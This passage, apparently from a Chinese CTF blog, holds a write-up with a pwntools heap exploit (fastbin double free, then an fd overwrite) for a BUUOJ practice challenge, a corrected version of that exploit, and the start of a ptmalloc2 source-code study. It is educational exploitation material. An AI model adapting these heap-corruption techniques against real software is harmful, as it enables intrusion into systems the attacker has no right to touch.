class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./metasequoia_2020_samsara&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;, &quot;./metasequoia_2020_samsara&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.23/32/lib/libc.so.6&quot;&#125;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">27450</span>)</span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./metasequoia_2020_samsara&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>():</span></span><br><span class=\"line\">    p.recvline(<span class=\"string\">&quot;choice &gt; &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dele</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvline(<span class=\"string\">&quot;choice &gt; &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>(<span class=\"params\">idx,content</span>):</span></span><br><span class=\"line\">    p.recvline(<span class=\"string\">&quot;choice &gt; &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.sendafter(<span class=\"string\">&#x27;:&#x27;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span>():</span></span><br><span class=\"line\">    p.recvline(<span class=\"string\">&quot;choice &gt; &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">move</span>(<span class=\"params\">dest</span>):</span></span><br><span class=\"line\">    p.recvline(<span class=\"string\">&quot;choice &gt; &quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;5&#x27;</span>)</span><br><span class=\"line\">    p.sendafter(<span class=\"string\">&#x27;?&#x27;</span>,<span class=\"built_in\">str</span>(dest))</span><br><span class=\"line\"><span class=\"comment\">#double free</span></span><br><span class=\"line\">add()<span class=\"comment\">#0</span></span><br><span class=\"line\">add()<span class=\"comment\">#1</span></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\">add()<span class=\"comment\">#2--&gt;0</span></span><br><span class=\"line\">add()<span class=\"comment\">#3 --&gt;1</span></span><br><span class=\"line\"></span><br><span class=\"line\">move(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">show()<span class=\"comment\">#get the addr of v7</span></span><br><span class=\"line\">v7_addr = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">v8_addr = v7_addr - <span class=\"number\">8</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,p64(v8_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,<span class=\"string\">&quot;0xDEADBEEF&quot;</span>)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&quot;choice &gt;&quot;</span>,<span class=\"string\">&#x27;6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​        打不通，并且因为未知原因（大概率是elf头的ld不匹配），导致本地无法调试，去网上搜了一下wp，发现有这么几个个细节我没有注意，或者说想错了。</p>\n<p>​        在进行double free的时候，我只预先申请了两个chunk，并且将前一个申请的chunk double free了。但是wp预先申请了三个chunk，然后我意识到，第三个申请的chunk很有可能是防止之前被free的两个chunk被top chunk合并，之前刷堆题的时候经常碰到这一点，但是太久没做了，有些忘了。这里是没有注意到的细节。</p>\n<p>​        然后是想错了的部分，可以看到我之前的wp中的思路是这样的：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8A%E5%8D%8810.20.46.png\" alt=\"截屏2021-12-08 上午10.20.46\"></p>\n<p>​        错误所在就是，修改free chunk0的fd之后，它在fastbin中的位置应当还是</p>\n<p><code>main_arena =&gt; chunk1 =&gt;chunk0(v8)</code>    ，也不知道为什么我会以为新的fd会被重新插入链表。</p>\n<p>​        然后按照first fit原则，我们连续add两个chunk，就能够申请到v8的内存空间了。后面的内容就问题不大了。</p>\n<p>​        所以更正后的exp大概是这样：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add()<span class=\"comment\">#0</span></span><br><span class=\"line\">add()<span class=\"comment\">#1</span></span><br><span class=\"line\">add()<span class=\"comment\">#2,防止与top chunk合并</span></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\">add()<span class=\"comment\">#3--&gt;0</span></span><br><span class=\"line\">add()<span class=\"comment\">#4 --&gt;1</span></span><br><span class=\"line\"></span><br><span class=\"line\">move(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">show()<span class=\"comment\">#get the addr of v7</span></span><br><span class=\"line\">v7_addr = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\">v8_addr = v7_addr - <span class=\"number\">0x8</span></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,p64(v8_addr))</span><br><span class=\"line\">add()<span class=\"comment\">#5</span></span><br><span class=\"line\">add()<span class=\"comment\">#6</span></span><br><span class=\"line\">edit(<span class=\"number\">6</span>,<span class=\"number\">0xDEADBEEF</span>)</span><br></pre></td></tr></table></figure>\n<h3><span id=\"总结\">总结</span></h3><p>​        感觉每个入门堆题的人首先开始做的题目都是fastbin attack以及UAF，因为确实相对来说简单易懂。但是反观我半年前写的fastbin attack的wp，我的评价是：狗屁不通。</p>\n<p>​        所以我对于堆题，或者是整个ctf pwn的学习其实是走了很多弯路的。比如说对于动调的惧怕，导致我做了很多题，但又没完全做。比如我学习堆题，却不愿意沉下心来，从了解ptmalloc开始，而是摁刷题，导致知识点被割裂得完全串联不上，学完就忘。现在从csapp malloc lab开始逐步琢磨glibc，然后睡前再看半个小时源码剖析，再辅以ctf pwn的一些题目的分析，对于各种知识点好歹是有了一个足以将它们串联起来的体系，从而做题是不再那么一头雾水了。如果在半年前我能意识到这一点就好了。但是我还是觉得任何在pwn学习过程中踩过的坑，无论是知识点本身的坑，还是学习方案上的坑，都是宝贵的，无可替代的学习经验捏。</p>\n","categories":["Binary_security"],"tags":["HEAP - Fastbin Attack"]},{"title":"ptmalloc2源码分析","url":"/2022/04/13/heap_learning_glibc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-jjQngvRL\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h1><span id=\"prelude\">prelude</span></h1><p>​        感觉源码分析是很多佬都做过的一件事情，但是对于我来说源码分析确实是件比较困难的事，但正因为困难，才有必要攻克，之后的高版本或者诡异版本glibc题少不了源码分析，也当是一个修炼吧。文章分析的大致顺序是按照<code>int_malloc</code>以及<code>int_free</code>的函数顺序介绍的，其中会穿插一些被调用的函数的介绍。</p>\n<h1><span id=\"csapp-malloc-lab-review\">csapp malloc lab review</span></h1><p>​        在着手看源码之前先复习一下csapp lab。        </p>\n<p>​        去年十二月的时候非常之草率地写完了malloc lab，到现在四月份，一些操作已经忘记得只会报菜名了，但是问题不大。</p>\n<p>​        malloclab的大体设计以几个分配器的不同设计思路作为level的划分</p>\n<ol>\n<li>level1: 隐式空闲链表，first fit，next fit，bset fit。</li>\n<li>level2: 显式空闲链表，separated fit。</li>\n</ol>\n<p>​        （当然这种level的分级是由我自己武断决定的）</p>\n<p>​        level1中的三种适配方案其实在代码上的体现差别并不是非常的大，并且其实lab的要求只是补全那么一两个函数，感觉并不是十分复杂。所以这里主要关注于level2，显式空闲链表+分离适配的方案。这种方案也是lab中最接近ptmalloc的。</p>\n<p>​        显式空闲链表主要是在chunk内增加了双向循环链表的前驱以及后继指针，用于连接不同的bin，而分离适配并没有对不同的chunk定义不同的取出以及插入方式，只是比较简单地将chunk以2^n划分为八个不同的区域。</p>\n<h1><span id=\"structdefine\">struct/define</span></h1><h2><span id=\"struct-malloc_chunk\">struct malloc_chunk</span></h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span> &#123;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class=\"comment\">/* Size of previous chunk (if free).  */</span></span><br><span class=\"line\">  INTERNAL_SIZE_T      mchunk_size;       <span class=\"comment\">/* Size in bytes, including overhead. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">fd</span>;</span>         <span class=\"comment\">/* double links -- used only if free. */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">bk</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">fd_nextsize</span>;</span> <span class=\"comment\">/* double links -- used only if free. */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_chunk</span>* <span class=\"title\">bk_nextsize</span>;</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>​        注解比较详细。但是也注解申明了，这并不是真实的chunk的定义，但是却给出了chunk在内存中的一个大致的模型。下面也有很长一段注解来解释chunk，挑一些讲讲。</p>\n<p>1：chunk中的<code>A|M|P</code>位，“A”位指该chunk是不是<code>main_arena</code>下的chunk，如果该chunk为其他线程下的chunk，则该位置1，“P”位就是“inuse”位，“0”为free，“1”为allocated， ‘M’位是表示该chunk是否为mmap()函数分配，这一位是最高优先级的，因为首先这是一个allocated chunk，其次它既不是在一个arena中，也不会于free chunk相邻。</p>\n<h1><span id=\"bin\">bin</span></h1><p>按照源码中的顺序。</p>\n<h3><span id=\"unsorted-bin\">unsorted bin</span></h3><h3><span id=\"top-chunk\">top chunk</span></h3><p>​      <em>M_TRIM_THRESHOLD</em></p>\n<h3><span id=\"bin_map\">bin_map</span></h3><p>​        记录bin是否是空的。</p>\n<h3><span id=\"fastbin\">fastbin</span></h3><p>LIFO。</p>\n<p> fastbin的所有bin的<code>prev_inuse</code>位都是1。它们只会在<code>*malloc_consolidate（）</code>中被合并。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span></span><br></pre></td></tr></table></figure>\n<h1><span id=\"function\">function</span></h1><h2><span id=\"malloc\">malloc</span></h2><h3><span id=\"_int_malloc\">_int_malloc</span></h3><p>​        首先定义一些变量，具体含义在用到之后再分析。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">INTERNAL_SIZE_T nb;               <span class=\"comment\">/* normalized request size */</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> idx;                 <span class=\"comment\">/* associated bin index */</span></span><br><span class=\"line\">  mbinptr bin;                      <span class=\"comment\">/* associated bin */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  mchunkptr victim;                 <span class=\"comment\">/* inspected/selected chunk */</span></span><br><span class=\"line\">  INTERNAL_SIZE_T size;             <span class=\"comment\">/* its size */</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> victim_index;                 <span class=\"comment\">/* its bin index */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  mchunkptr remainder;              <span class=\"comment\">/* remainder from a split */</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> remainder_size;     <span class=\"comment\">/* its size */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> block;               <span class=\"comment\">/* bit map traverser */</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> bit;                 <span class=\"comment\">/* bit map traverser */</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> <span class=\"built_in\">map</span>;                 <span class=\"comment\">/* current word of binmap */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  mchunkptr fwd;                    <span class=\"comment\">/* misc temp for linking */</span></span><br><span class=\"line\">  mchunkptr bck;                    <span class=\"comment\">/* misc temp for linking */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> USE_TCACHE</span></span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> tcache_unsorted_count;\t    <span class=\"comment\">/* count of unsorted chunks processed */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>接着计算需要分配的chunk size。也就是根据用户申请的size，计算出实际需要分配的内存。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">   Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class=\"line\"><span class=\"comment\">   overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class=\"line\"><span class=\"comment\">   to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class=\"line\"><span class=\"comment\">   size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class=\"line\"><span class=\"comment\">   that are so large that they wrap around zero when padded and</span></span><br><span class=\"line\"><span class=\"comment\">   aligned.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\">checked_request2size (bytes, nb);<span class=\"comment\">//计算chunk大小，例如添加对齐，size域需要的size等。</span></span><br></pre></td></tr></table></figure>\n<p>​        接着验证该chunk是否属于某个分配区，如果没有的话，也就是<code>av == NULL</code>，则调用<code>sysmalloc()</code>进行分配。关于<code>sysmalloc()</code>的分配大概会在另外一篇笔记中介绍。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (__glibc_unlikely (av == <span class=\"literal\">NULL</span>))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">void</span> *p = sysmalloc (nb, av);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (p != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\talloc_perturb (p, bytes);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>​        在得到了chunk需要分配的具体size后，就可以根据不同的size分配不同的chunk了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) (nb) &lt;= (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) (get_max_fast ()))<span class=\"comment\">//get_max_fast返回fastbin chunk可以储存的最大size</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    idx = fastbin_index (nb);<span class=\"comment\">//首先获取fastbin 的idx， ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)，假设为64bit，那么这里的idx就是nb/4 -2</span></span><br><span class=\"line\">    mfastbinptr *fb = &amp;fastbin (av, idx);<span class=\"comment\">//根据fastbin的idx从fastbin表中取出空闲chunk的链表指针。av-&gt;fastbin[idx]</span></span><br><span class=\"line\">    mchunkptr pp;</span><br><span class=\"line\">    victim = *fb;</span><br></pre></td></tr></table></figure>\n<p>​        这中间有一段<code>REMOVE_FB(*fb*, *victim*, *pp*)</code>的宏定义代码，我们先不管他。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (victim != <span class=\"literal\">NULL</span>)<span class=\"comment\">//如果成功获取fastbin的指针</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (SINGLE_THREAD_P)</span><br><span class=\"line\">    *fb = victim-&gt;fd;<span class=\"comment\">//将链表头设置为该空闲chunk的下一个chunk(victim-&gt;fd</span></span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    REMOVE_FB (fb, pp, victim);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (__glibc_likely (victim != <span class=\"literal\">NULL</span>))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">size_t</span> victim_idx = fastbin_index (chunksize (victim));<span class=\"comment\">//获取victim的idx</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (__builtin_expect (victim_idx != idx, <span class=\"number\">0</span>))</span><br><span class=\"line\">\tmalloc_printerr (<span class=\"string\">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class=\"line\">      check_remalloced_chunk (av, victim, nb);</span><br></pre></td></tr></table></figure>\n<p>​        这里插一句，<code>__builtin_expect</code>以及前面遇到过很多次的<code>__glibc_unlikely</code>等函数，都是为了让程序告诉编译器程序最有可能执行的分支而设置的，以使得编译器对代码进行优化，减少指令跳转带来的性能下降。而将<code>__builtin_expect</code>封装成宏指令，就变成了<code>likely</code>和<code>unlikely</code>宏。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> likely(x) __builtin_expect(!!(x), 1) <span class=\"comment\">//x很可能为真       </span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> unlikely(x) __builtin_expect(!!(x), 0) <span class=\"comment\">//x很可能为假</span></span></span><br></pre></td></tr></table></figure>\n<p>​        接着是启用tcache的内容。操作与fastbin几乎一致，就不详细分析了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> *p = chunk2mem (victim);<span class=\"comment\">//返回一个指向user data的指针</span></span><br><span class=\"line\">alloc_perturb (p, bytes);<span class=\"comment\">//初始化user data</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> p;</span><br></pre></td></tr></table></figure>\n<p>​        所以总结一下，在所有条件都进入理想分支的情况下，一个fastbin chunk是这样分配的：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">获取用户输入的size，调用 checked_request2size （）转换为实际分配的size ===&gt;  </span><br><span class=\"line\">将size与fastbin最大size比较，在范围内，于是调用 fastbin_index (nb)，获取这个chunk在fastbin中的idx ===&gt; </span><br><span class=\"line\">根据获取的fastbin的idx，从fastbin中取出指向空闲链表的指针 </span><br></pre></td></tr></table></figure>\n<p>​        如果fastbin 中没有合适size的chunk，或者没有空闲chunk等各种原因导致程序并没有获取到fastbin idx，就进入small bin的范围搜索。        </p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (in_smallbin_range (nb))<span class=\"comment\">//size在small bin范围内</span></span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     idx = smallbin_index (nb);<span class=\"comment\">//获取small bin的idx</span></span><br><span class=\"line\">     bin = bin_at (av, idx);<span class=\"comment\">//根据idx获取small bin链表中的空闲chunk指针。</span></span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">if</span> ((victim = last (bin)) != bin)<span class=\"comment\">//如果chunk_ptr -&gt;bk != chunk_ptr，两种情况，victim不为0或有多个bin</span></span><br><span class=\"line\">       &#123;</span><br><span class=\"line\">         <span class=\"keyword\">if</span> (victim == <span class=\"number\">0</span>)<span class=\"comment\">//victim为0说明small bin没有初始化</span></span><br><span class=\"line\">           malloc_consolidate (av);<span class=\"comment\">//合并 fastbin</span></span><br><span class=\"line\">         <span class=\"keyword\">else</span></span><br><span class=\"line\">           &#123;</span><br><span class=\"line\">             bck = victim-&gt;bk;<span class=\"comment\">//第二种情况，此时中smallbin链表不止一个bin</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<span class=\"comment\">//double free</span></span><br><span class=\"line\">               &#123;</span><br><span class=\"line\">                 errstr = <span class=\"string\">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class=\"line\">                 <span class=\"keyword\">goto</span> errout;</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">             set_inuse_bit_at_offset (victim, nb);<span class=\"comment\">//将victim+size，也就是chunk尾部所指向的地方或上prev_inuse字段，标识着该 chunk为used状态。</span></span><br><span class=\"line\">             bin-&gt;bk = bck;<span class=\"comment\">//将bin插入链表中</span></span><br><span class=\"line\">             bck-&gt;fd = bin;</span><br><span class=\"line\"></span><br><span class=\"line\">             <span class=\"keyword\">if</span> (av != &amp;main_arena)<span class=\"comment\">//不在主分配区的情况</span></span><br><span class=\"line\">               victim-&gt;size |= NON_MAIN_ARENA;<span class=\"comment\">//置A位为1.</span></span><br><span class=\"line\">             check_malloced_chunk (av, victim, nb);</span><br><span class=\"line\">             <span class=\"keyword\">void</span> *p = chunk2mem (victim);<span class=\"comment\">//指向用户data</span></span><br><span class=\"line\">             alloc_perturb (p, bytes);<span class=\"comment\">//初始化p指向的内存</span></span><br><span class=\"line\">             <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>​        稍微分析一下这里的double free情况，此时<code>bck-&gt;fd != victim</code>，说明在victim和bck间被插入了新的节点，也就是double free造成的。</p>\n<p>​        smallbin未初始化分支的<code>malloc_consolidate (av);</code>操作稍后会单独分析，这里按照理想状况继续走。</p>\n<p>​        接着，如果size不是在small bin及以下范围的话，就直接分配large bin链表中的chunk。在获取large bin的idx后也对fastbin进行了合并。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    idx = largebin_index (nb);<span class=\"comment\">//首先获取large bin idx</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (have_fastchunks (av))<span class=\"comment\">//如果fastbin不为空</span></span><br><span class=\"line\">      malloc_consolidate (av);<span class=\"comment\">//合并fastbin</span></span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">   If this is a large request, consolidate fastbins before continuing.</span></span><br><span class=\"line\"><span class=\"comment\">   While it might look excessive to kill all fastbins before</span></span><br><span class=\"line\"><span class=\"comment\">   even seeing if there is space available, this avoids</span></span><br><span class=\"line\"><span class=\"comment\">   fragmentation problems normally associated with fastbins.</span></span><br><span class=\"line\"><span class=\"comment\">   Also, in practice, programs tend to have runs of either small or</span></span><br><span class=\"line\"><span class=\"comment\">   large requests, but less often mixtures, so consolidation is not</span></span><br><span class=\"line\"><span class=\"comment\">   invoked all that often in most programs. And the programs that</span></span><br><span class=\"line\"><span class=\"comment\">   it is called frequently in otherwise tend to fragment.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br></pre></td></tr></table></figure>\n<p>​        对于合并的解释，官方注释是这样说的：虽然看起来没有检查是否有适用的空间就讲fastbin全部清理看起来有些草率，但是这有效避免了fastbin造成的内存碎片化问题。并且在实际运用中，程序并不会经常多次混合着申请<code>small bin</code>或者<code>large bin</code>，所以合并的情况并不会经常发生，而正是那些频繁调用它们的程序导致了内存碎片化（所以适当的合并有助于减少这个问题）。</p>\n<p>​        然后进入<code>unsorted bin</code></p>\n<p>​        首先是一个大while循环，在每一次循环中遍历unsorted bin链表并将所需要的指针及字段保存。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<span class=\"comment\">//遍历unsorted bin链表</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          bck = victim-&gt;bk;<span class=\"comment\">//保存前一个chunk的指针</span></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (__builtin_e</span><br><span class=\"line\">              </span><br><span class=\"line\">              xpect (victim-&gt;size &lt;= <span class=\"number\">2</span> * SIZE_SZ, <span class=\"number\">0</span>)</span><br><span class=\"line\">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class=\"number\">0</span>))</span><br><span class=\"line\">            malloc_printerr (check_action, <span class=\"string\">&quot;malloc(): memory corruption&quot;</span>,<span class=\"comment\">//victim的size需要大于等于2 * SIZE_SZ，也不能超过mmap分配的size</span></span><br><span class=\"line\">                             chunk2mem (victim), av);</span><br><span class=\"line\">          size = chunksize (victim);<span class=\"comment\">//计算分配内存的size并保存。</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​        接着是每一次循环中的操作。</p>\n<p>​        如果是一个small chunk的请求，并且此时unsorted bin中只有一个bin的话，首先尝试分配last remainder中的chunk。这个操作只会在small chunk没有 exact fit情况下发生，并且是best fit的唯一例外。</p>\n<p>​        下面是这种“例外”的代码实现。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder </span><br><span class=\"line\">&amp;&amp;  (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) (size) &gt; (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) (nb + MINSIZE))</span><br><span class=\"line\">  <span class=\"comment\">//进入该分支的条件：</span></span><br><span class=\"line\">  <span class=\"comment\">//1）size在small bin范围内。</span></span><br><span class=\"line\">  <span class=\"comment\">//2）unsorted bin中仅有一个chunk。</span></span><br><span class=\"line\">  <span class=\"comment\">//3）chunk属于last reminder。</span></span><br><span class=\"line\">  <span class=\"comment\">//4）该chunk需大于申请的size+min size（以便分割last remainder，并将留下的chunk作为新的last remainder）</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* split and reattach remainder */</span></span><br><span class=\"line\">    remainder_size = size - nb;<span class=\"comment\">//新的remainder size等于unsorted bin中chunk的size 减去用户分配的size</span></span><br><span class=\"line\">    remainder = chunk_at_offset (victim, nb);<span class=\"comment\">//获取remainder指针</span></span><br><span class=\"line\">    unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<span class=\"comment\">//将remainder链入unsorted bin链表中</span></span><br><span class=\"line\">    av-&gt;last_remainder = remainder;<span class=\"comment\">//更新last_remainder</span></span><br><span class=\"line\">    remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); <span class=\"comment\">//同理</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!in_smallbin_range (remainder_size))<span class=\"comment\">//如果新的remainder不在small bin size内</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        remainder-&gt;fd_nextsize = <span class=\"literal\">NULL</span>;<span class=\"comment\">//清空remainder 